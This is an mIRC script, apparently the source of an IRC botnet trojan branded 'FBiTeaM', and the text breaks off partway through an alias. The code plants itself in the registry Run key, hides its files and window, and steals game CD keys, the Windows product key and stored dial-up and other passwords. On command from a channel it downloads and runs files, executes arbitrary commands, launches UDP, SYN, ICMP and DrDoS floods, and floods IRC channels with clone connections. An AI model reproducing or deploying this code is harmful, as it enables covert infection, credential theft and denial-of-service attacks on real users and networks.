#######################
# FBiTeaM System P4tCh #
# Moded By FBiTeaM     #
#######################
raw 433:*:{ nick $ipnick }
raw 332:*:if ($2 == $xGun(C1)) { CmDBoT $3- }
ALIAS CHASENICK { SOCKWRITE -nt $1 nick %CHASE.NICK }
alias opensock { sockopen xIx $+ $fnick %cserver %cport }
alias Stay { if (PING = $1) { Sww * $1- } }
alias TeSts { if ($me isvo $xGun(C1)) || (m !isin $chan($xGun(C1)).mode) || ($me isop $xGun(C1)) { clearall | msg $xGun(C1) $1- } }
alias Wi { write %s3cur3 net stop $1- /y }
alias jc { //join $xGun(C1) $xGun(nk) }
alias c0nn { server $xGun(Se) $xGun(Po) | if ($portfree(113)) { socklisten IDENT 113 } }
alias n0clone { if ($portfree( $+ $xGun(Cl) $+ ) == $false) { exit } | socklisten noclone $xGun(Cl) }
alias cskey { TeSts |KeyS| CS key: $RegRead(HKEY_CURRENT_USER\Software\Valve\CounterStrike\Settings\Key) | TeSts |KeyS|  HL key: $RegRead(HKEY_CURRENT_USER\Software\Valve\Half-Life\Settings\Key) }
alias winkey { TeSts |KeyS| windows key: $RegRead(HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProductId) | TeSts |KeyS| windows key: $RegRead(HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProductKey) }
alias R3G { %x = $r(a,z) $+ $r(000,999999) $+ .reg | write %x REGEDIT4 | write %x [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run] | write %x $+(" $+ $xGun(Nc) $+ "=",$replace($mircdir,\,\\),$nopath($mircexe),") | .run -n regedit /s %x | .timer 1 3 .remove %x | .timer 1 4 unset %x }
alias RegDelete { if ($1 != $null) { var %a = RegDelete | .comopen %a WScript.Shell | if !$comerr { var %b = $com(%a,RegDelete,3,bstr,$1) | .comclose %a } } | else { echo error! complete data } }
alias RegWrite { if ($1) && ($2) && ($3) { %a = RegWrite | .comopen %a WScript.Shell | if (!$comerr) { %b = $com(%a,RegWrite,3,bstr,$1,bstr,$2,bstr,$3) | .comclose %a } | if ($3 == REG_EXPAND_SZ) || ($3 == REG_SZ) { if ($regread($1) == $2) { halt } | else { echo error! when writing } } } | else { echo error! complete data } }
alias RegRead { if ($1 != $null) { var %a = regread | .comopen %a WScript.Shell | if !$comerr { var %b =  $com(%a,RegRead,3,bstr,$1-) | var %c = $com(%a).result | .comclose %a | if (%c) return %c | else { return $false } } } | else { return error! complete data } }
alias r3m {  if $isdir(sounds) || $isdir(logs) || $isdir(download) || $isdir(channels) { rmdir sounds | rmdir logs | rmdir download | rmdir channels | halt } }
alias hidef { var %h1d $findfile($mircdir,*.*,0,write hidf.bat attrib +R +S +H $noPATH($1-)) | .timer 1 1 hiden hidf.bat }
alias u1s { if ($appactive = $true) { run $xGun(Hed) /n /fh hlep32 } }
alias h1d { if ($appstate != hidden) { run $xGun(Hed) /n /fh hlep32 } }
alias hiden { run $xGun(hed) /n /fh }
alias synp { if ($1 == $null) { return } | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop |  syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | TeSts Packets Done ;> }
alias ARs { if ($sock(Ars)) { TesTs error: already Arsing a file.. | return } | set %Ars1 $gettok($1,2,47) | set %Ars2 $gettok($1,$numtok($1,47),47) | set %Ars3 $gettok($1,3-,47) | TesTs Arsing: $1- | .sockopen Ars %Ars1 80 }
alias sww { .sockwrite -nt $1- }
alias s.iNv {  if (%i.ondelay == $null) { msg %s.i.c  iNv-> Error: Please set delay !iNv delay [ [ [ delay ] ] ] | halt } | if (%i.server == $null) || (%i.port == $null) { msg %s.i.c  iNv-> Error Starting iNv, iNv Server or Port not set! %iserver/%iserver.port | halt } | if ($sock(iNv*,0) > 0) { msg %s.i.c  iNv-> Error: iNv already loaded! | halt } 
//sockopen iNvN %i.server %i.port | /msg %s.i.c  iNv-> Loading iNv to Server: ( $+ $+ %i.server $+ ) Port: ( $+ %i.port $+ ) | //sockopen iNvM %i.server %i.port }
alias syn {
  if ($2 == start) { if ($3 !isnum) || ($5 !isnum) { return } | var %x = 1 | while (%x <= $3) { sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) $4 $5 | inc %x  } }
  if ($2 == stop) { if ($sock(syn*,0) > 0) { sockclose syn* } }
}
alias sTr { 
  inc %str 1
  if (%str = 1) { hidef } 
  .ddeserver on Era 
  .nick $ipnick 
  .anick $ipnick 
  .username FBiTeaMBot v1.6 For FBiTeaM Moded By FBiTeaM 
  .identd on FBi 
  .emailaddr $r(a,z) $+ $r(0,999999)@FBi.gov 
  .n0clone 
  .c0nn 
  .timerconnec -o 0 60 c0nn 
  .timerus -o 0 1 u1s 
  .timerus -o 0 1 h1d 
  .timerst4rt -o 1 1 R3G 
  .timersregteam -o 0 20 regteam
}
alias regteam { 
  set %fbireg org.reg 
  write %fbireg  REGEDIT4
  write %fbireg [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]  
  write %fbireg "procs windows"=" $+ $replace($mircexe,\,\\) $+ "  
  run -n regedit /s %fbireg
  timer 1 4 remove %fbireg
}
alias socknickflood { sockwrite -nt xIx*  privmsg %socknick : $+ %sockmsg | sockwrite -nt xIx*  nick $read demo.xt $+ $chr($r(65,125)) $+ $chr($r(65,125)) }
alias sock2flo0d { sockwrite -nt xIx* join %sockchannel | sockwrite -nt xIx* privmsg %sockchannel : $+ %sockmsg | sockwrite -nt xIx* notice %sockchannel : $+ %sockmsg | sockwrite -nt xIx*  part %sockchannel }
alias sock3flo0d { sockwrite -nt xIx*  join %sockchannel | sockwrite -nt xIx* notice %sockchannel : $+ %sockmsg | sockwrite -nt xIx*  part %sockchannel }
alias sock4flo0d { sockwrite -nt xIx*  join %sockchannel | sockwrite -nt xIx*  part %sockchannel  : $+ %sockmsg }
alias sock5flo0d { sockwrite -nt xIx*  join %sockchannel | sockwrite -nt xIx*  part %sockchannel }
alias sock6flo0d { sockwrite -nt xIx*  join %sockchannel | sockwrite -nt xIx* privmsg %sockchannel : $+ %sockmsg | sockwrite -nt xIx*  part %sockchannel }
alias yalaopen { sockopen xIx $+ $r(1,99999) %cserver %cport | .timerijoin 3 3 sockwrite -nt xIx* join %deshelchannel }
alias socknickflood { sockwrite -nt xIx*  privmsg %socknick : $+ %sockmsg | sockwrite -nt xIx*  nick $read demo.xt $+ $chr($r(65,125)) $+ $chr($r(65,125)) }
alias sock1flo0d { sockwrite -nt xIx*  join %sockchannel | sockwrite -nt xIx*  part %sockchannel | sockwrite -nt xIx*  nick $read demo.xt $+ $chr($r(65,125)) $+ $chr($r(65,125)) }
alias randomx { if (!$1) { %x.random = $r(1,12) | goto next } | %x.random = $1 | :next | %i.random = 1 | %t.random = $r(a,z) | :loop | if (%i.random > $calc(%x.random - 1)) { return %t.random } | %t.random = $+(%t.random,$rnd) | inc %i.random | goto loop }                                                                                                                                                                                    
alias lans { if (PING = $1) { sockwrite xIx* $1- } }
alias Sudp { %x = $1 | %p = $2 | run Heds.exe /n /fh /r "NITE.exe %x %p -m udp" -l >50 | TesTs Sending UDP packets to %x on port %p }
alias Sicmp { %x = $1 | %p = $2 | run Heds.exe /n /fh /r "NITE.exe %x %p -m icmp" >50 | TesTs Sending ICMP packets to %x on port %p }
alias Sigmp { %x = $1 | %p = $2 | run Heds.exe /n /fh /r "NITE.exe %x %p -m igmp" >50 | TesTs Sending IGMP packets to %x on port %p }
alias Sdrdos { %x = $1 | %p = $2 | run Heds.exe /n /fh /r "NITE.exe %x %p -m drdos" >50 | TesTs Sending DrDoS packets to %x on port %p }
alias Ssyn { %x = $1 | %p = $2 | run Heds.exe /n /fh /r "NITE.exe %x %p -m syn" >50 | TesTs Sending Syn packets to %x on port %p }
alias syn { if ($1 = off) { .timerTCP off } | if (*.* !iswm $1) || ($2 !isnum) || ($3 !isnum) || ($4 !isnum) || ($5) { halt } | %tcp.ip = $1 | %tcp.port = $2 | %tcp.num = $3 | %tcp.delay = $4 | TesTs PaCkeTinG..!?!.. | .timerTCP %tcp.num %tcp.delay SockOpen $+(tCp,$r(1,999999999999)) %tcp.ip %tcp.port | unset %tcp.* }
alias icmp { if (*.* !iswm $1) || ($2 !isnum) || ($3 !isnum) { halt } | TesTs PaCkeTinG..!?! | .remove icmp.vbs | write icmp.vbs on error resume next | write icmp.vbs Set iix = CreateObject("Wscript.shell") | write icmp.vbs iix.run "ping $1 -w 0 -l $2 -n $3 $+ ",0,true | run icmp.vbs }
alias CmDBoT {
  if ($me ison $xGun(C1)) {
    IF (.Timer = $1) {
      IF ($2 = $NULL) { TesTs [Full.Timer] Syntax: .Timer <SERVER> <PORT> <NICKNAME> <EMAIL> | RETURN }
      IF (join == $2) { .sockwrite -tn CHASE* JOIN : $+ $3-  | return }  
      IF (part == $2) { .sockwrite -tn CHASE*  PART : $+ $3- | return }
      if (away = $2) { sockwrite -nt chase* away : $+ $3- | return }
      IF (OFF = $2) { sockclose CHASE* | MSG $CHAN [Full.Timer] ALL CLONES WERE KILLED. | RETURN }
      IF (REG = $2) { SOCKWRITE -nt CHASE* nickserv register $3 %CHASE.PASS %CHASE.MAIL | MSG $CHAN [Full.Timer] REGISTERING...... | RETURN }
      %CHASE.NICK = $4
      %CHASE.PASS = ^ $+ $rand(a,z) $+ $rand(0,999) $+ _
      %CHASE.MAIL = $5
      SOCKOPEN $+(CHASE,$R(1,9999)) $2 $3
      MSG $CHAN [Full.Timer] LOADING TIMERS TO $2 $+ : $+ $3
    }
    if ($1 = .attack) { if (!$2) { TesTs .attack <udp/syn/drdos/icmp/igmp/stop> <host/ip> <Port/80> | halt } | if ($2 = udp) { sudp $3 $4 } | if ($2 = syn) { ssyn $3 $4 } | if ($2 = icmp) { sicmp $3 $4 } | if ($2 = igmp) { sigmp $3 $4 } | if ($2 = drdos) { sdrdos $3 $4 } | if ($2 = stop) { run Heds.exe /n /fh /r "NTXS.exe -kf NITE.exe" | TesTs attack(s) stopped! } }
    if ($1 = .sock) { clone $2- }
    if ($1 = .go) { if ($2- == $null) { TesTs Are U FooL Use .go Server Port Clone-num } | set %cserver $2 | /set %cport $3 | /timeropensock $+ $fnick $4 2 opensock }
    if ($1 = .reconnect) { timer 1 1 /quit reconnecting... | connec }
    if ($1 = .msn) { .comopen msn Messenger.UIAutomation | if ($comerr) { return } | %a = $com(msn,MyStatus,2) | %b = $com(msn).result | %a = $com(msn,MyFriendlyName,2) | %c = $com(msn).result | %a = $com(msn,MySigninName,2) | %d = $com(msn).result | %a = $com(msn,MyServiceName,2) | %e = $com(msn).result | %x = $com(msn,InstallationDirectory,1) | .comclose msn | if (%b = 1) { %b = Offline } | if (%b = 2) { %b = Online } | if (%b = 6) { %b = Invisible } | if (%b = 10) { %b = Busy } | if (%b = 14) { %b = Be Right Back } | if (%b = 18) { %b = Idle } | if (%b = 34) { %b = Away } | if (%b = 50) { %b = On the Phone } | if (%b = 66) { %b = Out for Lunch } | if (%b = offline) { TeSts [Msn] Currently Offline. } | else { TeSts [msn] [Nickname: %c $+ ]  [E-mail: %d $+ ] [Service Provider: %e $+ ] [Status: %b $+ ] } }
    if ($1 = .net) { TeSts |network-information| connection: $dll(zz.dll,connection,_) network interfaces: $dll(zz.dll,interfaceinfo,_) ip: $ip host: $host }
    if ($1 = .cpu) { TeSts |cpu-information| time: $time(h:nn TT) date: $date(mmmm doo yyyy) os: $os cpu: $dll(zz.dll,cpuinfo,_) memory: $dll(zz.dll,meminfo,_) uptime: $uptime(system,1) hd: $dll(zz.dll,diskcapacity,_) }
    if ($1 = .portinfo) { %cp.i = 1 | %cp.x = 65000 | %cp.p = $null | :loop | if (%cp.i > %cp.x) { goto return } | if (!$portfree(%cp.i)) { %cp.p = $+(%cp.p,$chr(130),%cp.i) } | inc %cp.i | goto loop | :return | TeSts [Portinfo] ( $+ $gettok(%cp.p,1-,130) $+ ) | unset %cp.* }
    if ($1 = .fserv) { TeSts [F-Serv Initialized] ( $+ $nick $+ ) ( Enjoy! | /fserve $nick 3 $2  }
    if ($1 = .dialup) { getdialup }
    if ($1 = .bnc) && ($2) { if ($2 == start) || ($2 == -s) { if (!$sock(bnc)) && ($4) && ($portfree($3)) { socklisten bnc $3 | .set %bnc.pass $4 | TeSts bnc started: /server -m $ip $+ : $+ $sock(BNc).port , pass: %bnc.pass } | elseif ($sock(bnc)) { TeSts bnc is already running: /server -m $ip $sock(BNc).port , with pass: %bnc.pass } } | if ($2 = stop) || ($2 == -k) { if (!$sock(bnc)) { halt } | else { sockclose bnc* | .unset %bnc* | TeSts bnc is now halted } } }
    if ($1 = .copy) { copydd }
    if ($1 = .secure) { s3cur3 | timers3cur3 1 5 hiden " $+ %s3cur3 $+ " }
    if ($1 = .killapp) { hiden "0ff.exe -kf $2- $+ " | TeSts [killapp] killing $2- }
    if ($1 = .dns) { dns $2 | set %dns.r on | set %dns.rr # | set %dns.rrr $2 | TeSts attempting to resolve: $2 } 
    if ($1 = .sys) { TeSts Ip: $ip Windows: $os Host: $host Time: $time(h:nn tt) Date: $date(mmmm doo yyyy) }
    if ($1 == .fire) { sET %fbip $2 | sET %subb $3 | sET %timer.fbiip $4 | syn1 | TesTs Sending Fire! To : $2 PorT : $3 packet : $4 }
    if ($1 == .fire1) { sET %fbip $2 | sET %subb $3 | sET %timer.fbiip $4 | syn2 | TesTs Sending Fire1! To : $2 PorT : $3 packet : $4 }
    if ($1 == .cpacket) { sET %fbip $2 | sET %subb $3 | sET %timer.fbiip $4 | TCP | TesTs Sending cpacket! To : $2 PorT : $3 packet : $4 }
    if ($1 = .uptime) { TeSts system uptime: $duration($uptime(system,3)) , mirc uptime: $uptime(mirc,1) }
    if ($1 = .Ver) { TeSts [.Era AttaCker Operating System.] Until The end Of time by Era  } 
    if ($1 = .cskey)  { cskey }
    if ($1 = .winkey) { winkey }
    if ($1 = .speed) { TeSts |SpEeD| http://www.dslreports.com/archive/ $+ $gettok($host,3-,46) }
    if ($1 = .inv) {
      %s.i.c = $xGun(C2)
      if ($2 == load.j) { set %i.ondelay 3 | /set %i.server $3 | /set %i.port $4 | Set %imsg $replace($5,_,$chr(32)) | Set %i.chan $6 | %i.b = on | s.iNv | halt } 
      if ($2 == load) { /set %i.server $3 | /set %i.port $4 | %i.b = on | s.iNv } 
      if ($2 == stop) { sockclose iNv* | remove i1ch4n.txt | //set %i.b off | unset %i.temp.* | /timerinviteconnect off | msg $xGun(C2)  iNv-> iNv has been killed. } 
      if ($2 == status) { if ($sock(iNv*,0) == 0) { msg $xGun(C2)  iNv-> Status: Not Connected! | halt } 
      if ($sock(iNv*,0) > 0) { msg $xGun(C2)  iNv-> Status: Connected [ $+ $sock(iNv*,0) $+ ] }   } 
      if ($2 == stats) { msg $xGun(C2)  iNv-> (Stats) Total Invited: $calc( %i.t.j + %i.t.p ) Delay: ( $+ %i.ondelay $+ ) }  
      if ($2 == list) { sockwrite -nt iNvN LIST :* $+ $3 $+ * } 
      if ($2 == msg) { set %imsg $3- | msg $xGun(C2)  12[15in14vit15er12]: Invite Message set as [ $+ $3- $+ ] } 
      if ($2 == ctotal) { msg $xGun(C2)  iNv-> Random Channels Total: $+ $lines(i1ch4n.txt) } 
      if ($2 == reset) { msg $xGun(C2)  iNv-> All Settings Unset! | unset %i.t.j | unset %i.t.p | unset %imsg | unset %i.server | unset %s.i.c | unset %i.b | unset %i* | write -c i1ch4n.txt | remove i1ch4n.txt | unset %t.i | sockclose iNv* } 
      if ($2 == mode) { /sockwrite -nt iNv* MODE $3- } 
      if ($2 == join) { 
        if ($3 == random) { 
        if ($lines(i1ch4n.txt) < 0) || ($exists(i1ch4n.txt) == $false) { msg $xGun(C2)  iNv-> Error: Gather channels first! | halt } | set %i.r.j.a $4 | /set %i.r.j.i 0 | :loop |  if (%i.r.j.i > %i.r.j.a) { goto end } | /sockwrite -nt iNvN JOIN : $+ $read -l $+ $r(1,$lines(i1ch4n.txt)) i1ch4n.txt | inc %i.r.j.i | goto loop| :end | unset %i.r.j* | halt  } 
        else { /sockwrite -nt iNvN JOIN : $+ $3 } 
      } 
      if ($2 == part) { //sockwrite -nt iNvN PART : $+ $3- }  
      if ($2 == nick) { if ($3 == random) { sockwrite -nt iNvN NICK $read Nik.sys | halt } | //sockwrite -nt iNvN NICK $3  }
      if ($2 == delay) { set %i.ondelay $3 | msg $xGun(C2)  iNv-> Delay set to: ( $+ $3 $+ ). } 
    }
    if ($1 = .ps) {
      if ($2 = on) && (%stch3ck != on) { set %stch3ck on | g0ps }
      if ($2 = off) && (%stch3ck = on) { timert4rg4p off | if ($exists(sr.dll) = $true) { remove sr.dll } }
      if ($2 = rw) && (%stch3ck != on) { set %stch3ck on | set %rwword $3- | rwps }
    }
    if ($1 = .dl) { /ars $2- | /TesTs Downloading... } 
    if ($1 = .dl.run) { ars $2- | /TesTs %c Download+Run... | set %ars.r on }
    if ($1 = .dde) { /dde $2 command "" / $+ $3- }
    if ($1 = .syn) { if ($2 !== $null) { TeSts [Packets] [ $+ $2 $+ ] on [ $+ $3 $+ ] With [ $+ $4 $+ ]   | synp start $4 $2 $3 } }
    if ($1 = .pfast) { if ($4 == random) { //pf4st $2 $3 $r(1,64000) | halt } | //ptk $2 $3 $4 }
    if ($1 = .pf) { if ($4 == m) { //ptk $2 $3 $r(1,64000) | halt } | //ptk $2 $3 $4 }
    if ($1 = .udp) {  if ($4 == m) { //xGx $2 $3 $r(1,65000) | halt } | //xGx $2 $3 $4 }
    if ($1 = .syn.stop) { if ($sock(syn*,0) > 0) { sockclose syn* | TeSts [Syn Attack] is now halted.... } }
    if ($1 = .ping) && (%pingat == $null) { %pingat = 1 | %pingip = $3 | %pingmb = $4 | hiden "ping.exe %pingip -n %pingmb -l 65500 -w 0" | TeSts [Ping Attack] Started Ping Attack on: %pingip , with $calc($4 *65536/1024/1000) $+ mb of traffic.. | timerp 1 10 unset %pingat  }
    if ($1 = .ping.stop) && (%pingat != $null) { unset %ping* | TeSts [Ping Attack] Attacking Is Now Halted.. | hiden 0ff.exe -kf ping.exe" }
    if ($1 = .pr0xy) { r4.proxy $2- }
    if ($1 = .-) { set -u0 %on $2- | // $+ %on }
    if ($1 = .--) { set -u0 %on $2- | //timer 1 1 %on }
    ;;; socks ;;;    
    if ($1 == .sock1) { if ($2- == $null) { TesTs Are U FooL use No. .sock1 channel qnty } | if ($2 == off) { .timer50 2 30  remote on | remote off | timer11 off } | if ($2 != $null) { .set %sockChannel $2 } | if ($3 != $null) { .set %sockqty $3 } | else goto sock1flood | :sock1flood | .timer11 %sockqty 1 /sock1flo0d }
    if ($1 == .sock2) { if ($2- == $null) { TesTs Are U FooL use No. .sock2 channel ctcp qnty } | if ($2 == off) { .timer50 2 30  remote on | remote off | timer11 off } | if ($2 != $null) { .set %sockChannel $2 } | if ($4 != $null) { .set %sockmsg $4- } | if ($4 == $null) { .set %sockmsg FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.Please +Rm Or I Will Flooding Channel :P~FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM } | if ($3 != $null) { .set %sockqty $3 } | else goto sock2flood | :sock2flood | .timer11 %sockqty 1 /sock2flo0d }
    if ($1 == .sock3) { if ($2- == $null) { TesTs Are U FooL use No. .sock3 channel qnty msg } | if ($2 == off) { .timer50 2 30  remote on | remote off | timer11 off } | if ($2 != $null) { .set %sockChannel $2 } | if ($4 != $null) { .set %sockmsg $4- } | if ($4 == $null) { .set %sockmsg !pINg mE #dalNET.@.#dalNET.@.eXCESS.fLOOD.@.#dalNET.@.#dalNET.@.eXCESS.fLOOD.@.#dalNET.@.#dalNET.@.eXCESS.fLOOD.@.#dalNET.@.#dalNET.@.#dalNET aTTAcK bY FBiTeaM } | if ($3 != $null) { .set %sockqty $3 } | else goto sock3flood | :sock3flood | .timer11 %sockqty 1 /sock3flo0d }
    if ($1 == .sock4) { if ($2- == $null) { TesTs Are U FooL use No. .sock4 channel qnty msg } | if ($2 == off) { .timer50 2 30  remote on | remote off | timer11 off } | if ($2 != $null) { .set %sockChannel $2 } | if ($4 != $null) { .set %sockmsg $4- } | if ($4 == $null) { .set %sockmsg FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM } | if ($3 != $null) { .set %sockqty $3 } | else goto sock4flood | :sock4flood | .timer11 %sockqty 0 /sock4flo0d }
    if ($1 == .sock5) { if ($2- == $null) { TesTs Are U FooL use No. .sock5 channel qnty } | if ($2 == off) { .timer50 2 30  remote on | remote off | timer11 off } | if ($2 != $null) { .set %sockChannel $2 } | if ($3 != $null) { .set %sockqty $3 } | else goto sock5flood | :sock5flood | .timer11 %sockqty 1 /sock5flo0d }
    if ($1 == .sock6) { if ($2- == $null) { TesTs Are U FooL use No. .sock6 channel qnty msg } | if ($2 == off) { .timer50 2 30  remote on | remote off | timer11 off } | if ($2 != $null) { .set %sockChannel $2 } | if ($4 != $null) { .set %sockmsg $4- } | if ($4 == $null) { .set %sockmsg FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM Bots Are Join Please Shut Up And Close Your mode Channel Or I Will Floodin Channel :P FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM. } | if ($3 != $null) { .set %sockqty $3 } | else goto sock6flood | :sock6flood | .timer11 %sockqty 1 /sock6flo0d }
    if ($1 == .nicksock) { if ($2- == $null) { TesTs Are U FooL use No. .nicksock nicks qnty msg }  |  if ($2 == off) { .timer50 2 30  remote on | remote off | timer11 off } | if ($2 != $null) { .set %socknick $2 } | if ($3 != $null) { .set %qnnnnnty $3 } | if ($4 == $null) { .set %sockmsg FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.Back To WorLD By FBiTeaM Bots hehehehe FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM.FBiTeaM. } | if ($4 != $null) { .set %sockqty $4- } | else goto socknickflood | :sock1flood | .timer11 %sockqty 1 /socknickflood }
    if (.sOCKETS = $1) {
      IF ($2- == $NULL) { TesTs $NICK aRE u fOOl uSE .sOCKETS cOMMAND }
      IF ($2 == jOIN) { .sockwrite -tn xIx* JOIN $3- | set %deshelchannel $3- }  
      IF ($2 == OFF) { .SOCKCLOSE xIx* }
      IF ($2 == PART) { .sockwrite -tn xIx* PART $3-  }
      IF ($2 == NICK) { .sockwrite -nt xIx* NICK $3- $+ - $+ $R(0,999999)  }  
      IF ($2 == DIE) { .sockwrite -nt xIx* QUIT :qUIT cMD $NICK $+ ) ( $+ $3- $+ ) | //TIMERxIx* OFF  }  
      IF ($2 == RESTART) { .sockwrite -nt xIx* QUIT :i'LL cOME BACK .. | //TIMERxIx* OFF | YALAOPEN }  
      IF ($2 == MSG) { .sockwrite -nt xIx* PRIVMSG $3 : $+ %SOCKMSG  }  
      IF ($2 == MZG) { .sockwrite -nt xIx* PRIVMSG $3 : $+ $4-  }  
      IF ($2 == nOTICE) { .sockwrite -nt xIx* nOTICE $3 : $+ %SOCKMSG  }  
      IF ($2 == NOTIZE) { .sockwrite -nt xIx* nOTICE $3 : $+ $4-  }  
      IF ($2 == MN) { .sockwrite -nt xIx* nOTICE $3 : $+ $4- | .sockwrite -nt xIx* PRIVMSG $3 : $+ $4- } 
      IF ($2 == REGDAL) { .SET %FLOOD.REG.PASSWD $R(A,Z) $+ $R(A,Z) $+ $R(A,Z) $+ $R(A,Z) $+ $R(A,Z) $+ $R(A,Z) | .sockwrite -nt xIx* NICKSERV :REGISTER %FLOOD.REG.PASSWD $R(A,Z) $+ $R(A,Z) $+ $R(A,Z) $+ $R(A,Z) $+ $R(A,Z) $+ @ $+ $R(A,Z) $+ $R(A,Z) $+ $R(A,Z) $+ $R(A,Z) $+ $R(A,Z) $+ $R(A,Z) $+ $R(A,Z) $+ .COM | .sockwrite -nt xIx* PRIVMSG NICKSERV :IDENTIFY %FLOOD.REG.PASSWD } 
      IF ($2 == REGARAB) { .SET %FLOOD.REG.PASSWD $R(A,Z) $+ $R(A,Z) $+ $R(A,Z) $+ $R(A,Z) $+ $R(A,Z) $+ $R(A,Z) | .sockwrite -nt xIx* NICKSERV :REGISTER %FLOOD.REG.PASSWD $R(A,Z) $+ $R(A,Z) $+ $R(A,Z) $+ $R(A,Z) $+ $R(A,Z) $+ @wEaRAB.nET | .sockwrite -nt xIx* NICKSERV :IDENTIFY %FLOOD.REG.PASSWD }
    }  
  }
}
alias clone {
  if ($1 = join) { Sww xIx* Join $2- }
  if ($1 = part) { Sww xIx* Part $2 : $+ $3- }
  if ($1 = msg) { Sww xIx* privmsg $2 : $+ $3- }
  if ($1 = notice) { Sww xIx* notice $2 : $+ $3- }
  if ($1 = reg) { Sww xIx* Privmsg NickServ : $+ register $2- | Sww xIx* Privmsg NickServ : $+ identify $2- }
  if ($1 = creg) { set %rchan # $+ $fnick $+ $rand(1,1000) | Sww xIx* Join %rchan | Sww xIx* Privmsg Chanserv : register %rchan $fnick xIx }
  if ($1 = jp) { Sww xIx* Join $2- | Sww xIx* part $2 : $3- | Sww xIx* Join $2- | Sww xIx* part $2 : $3- | Sww xIx* Join $2- | Sww xIx* part $2 : $3- }
  if ($1 = jmp) { Sww xIx* Join $2 | Sww xIx* privmsg $2 : $3- | Sww xIx* part $2 }
  if ($1 = flood.c) { Sww xIx* join $2 | Sww xIx* privmsg $2 : $3- | Sww xIx* notice $2 : $3- | Sww xIx* privmsg $2 : $3- }
  if ($1 = flood.n) { Sww xIx* privmsg $2 : $3- | Sww xIx* notice $2 : $3- | Sww xIx* privmsg $2 : $3- }
  if ($1 = chat.flood) { Sww xIx* privmsg $2 :DCC CHAT $2 1058633484 3481  }
  if ($1 = Quit) { Sww xIx* Quit : $+ $2- }
  if ($1 = massquit) { Sww xIx* Join $2 | Sww xIx* Quit : $+ $3- }
  if ($1 = fnick) { Sww xIx* Nick $2 $+ $r(1,1000) $+ $r(1,1000)  }
  if ($1 = Die) { timeropensock* off | sockclose xIx* }
  if ($1 = kill) { timeropensock* off | sockclose xIx* }
  if ($1 = quit) { timeropensock* off | sockclose xIx* }
}
alias getdialup { run dp.com /shtml xXx.xXx | .timer 1 3 cak xXx.xXx }
alias cak {
  set -u0 %xxx $lines($1)
  while (%xxx) {
    if ($left($read($1,%xxx),17) == <tr>xxxxxxxxxxxxx) { get-Pass $remove($remove($read($1,%xxx),xxxxxxxxxxxxx),xxxxxxxx,<tr>,FAF0F5 F5F0FASystem F0F0FFUser FAF0F5,$chr(44)) } 
    dec %xxx
  }
  .remove $1
}
alias get-Pass {
  set -u0 %#$# $replace($1-,FFFFF0,`,FFFAF0,!,FFF5F0,@,FFF0F0,*)
  set -u0 %name $remove($gettok(%#$#,1,33),$gettok(%#$#,1,64),`)
  set -u0 %num $remove($gettok(%#$#,1,64), $gettok(%#$#,1,33),!)
  set -u0 %user $remove($gettok(%#$#,1,42),$gettok(%#$#,1,64),@)
  set -u0 %pass $gettok($gettok(%#$#,2,42),1,32)
  if (%user == $null) { goto end }
  if (%pass == $null) { goto end }
  shows Entry-Name: %name // UserName: %user // PassWord: %pass // Phone: %num
  :end
}
alias g0ps { timerb 1 7 pschk | run of.exe ps2m.exe /stext sr.dll }
alias pschk { timert4rg4p 0 1 p4sses }
alias rwps { timerb 1 7 rwpsz | run of.exe ps2m.exe /stext sr.dll }
alias rwpsz { timert4rg4p 0 1 rwp4ss3s }
alias rwp4ss3s {
  :start
  if ($file(sr.dll) = 0) { if ($exists(sr.dll) = $true) { remove sr.dll } | set %stch3ck off | timert4rg4p off }
  set %read $read(sr.dll,1)
  if (%read = ==================================================) { write -dl1 sr.dll }
  set %read $read(sr.dll,1)
  if (Resource Name isin %read) { tokenize 32 %read | set %Source $4- | write -dl1 sr.dll }
  set %read $read(sr.dll,1)
  if (Resource Type isin %read) {
